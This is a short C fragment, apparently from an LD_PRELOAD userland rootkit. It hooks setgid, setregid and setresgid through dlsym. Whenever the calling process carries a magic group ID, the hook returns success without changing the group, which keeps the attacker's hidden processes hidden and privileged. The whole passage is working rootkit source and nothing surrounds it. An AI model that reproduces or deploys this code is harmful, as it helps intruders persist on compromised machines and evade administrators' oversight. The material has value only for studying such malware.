
int setgid(gid_t gid) {
  if(!libc) libc=dlopen(LIBC_PATH,RTLD_LAZY);
  if(!old_setgid) old_setgid=dlsym(libc,"setgid");
  if(getgid()==MAGIC_GID) return 0; // for your own damn good.
  return old_setgid(gid);
}
int setregid(gid_t rgid, gid_t egid) {
  if(!libc) libc=dlopen(LIBC_PATH,RTLD_LAZY);
  if(!old_setregid) old_setregid=dlsym(libc,"setregid");
  if(getgid()==MAGIC_GID) return 0; 
  return old_setregid(rgid,egid);
}
int setresgid(gid_t rgid, gid_t egid, gid_t sgid) {
  if(!libc) libc=dlopen(LIBC_PATH,RTLD_LAZY);
  if(!old_setresgid) old_setresgid=dlsym(libc,"setresgid");
  if(getgid()==MAGIC_GID) return 0; 
  return old_setresgid(rgid,egid,sgid);
}


